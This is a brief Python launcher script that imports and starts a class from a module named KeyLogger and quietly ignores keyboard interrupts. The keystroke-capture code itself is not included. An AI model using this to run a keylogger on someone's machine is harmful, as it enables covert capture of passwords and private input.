import Modules.KeyLogger as KeyLogger

if __name__ == '__main__':
    try:
        KeyLogger.KeyLogger()
    except KeyboardInterrupt as e:
        # print("\rExiting...")
        pass